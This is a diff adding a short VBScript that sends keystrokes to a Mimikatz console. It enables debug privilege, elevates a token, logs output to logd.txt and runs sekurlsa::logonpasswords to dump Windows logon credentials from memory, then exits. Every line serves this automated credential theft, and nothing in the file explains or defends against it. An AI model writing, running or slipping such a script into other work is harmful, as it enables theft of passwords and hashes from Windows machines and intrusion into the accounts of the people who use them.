@@ -1,0 +1,19 @@
+Set obj=CreateObject("wscript.shell")
+wscript.sleep (500)
+obj.Sendkeys "cls"
+obj.Sendkeys "{ENTER}"
+wscript.sleep (200)
+obj.Sendkeys "privilege::debug"
+obj.Sendkeys "{ENTER}"
+wscript.sleep (200)
+obj.Sendkeys "token::elevate"
+obj.Sendkeys "{ENTER}"
+wscript.sleep (200)
+obj.Sendkeys "log logd.txt"
+obj.Sendkeys "{ENTER}"
+wscript.sleep (200)
+obj.Sendkeys "sekurlsa::logonpasswords"
+obj.Sendkeys "{ENTER}"
+wscript.sleep (200)
+obj.Sendkeys "exit"
+obj.Sendkeys "{ENTER}"
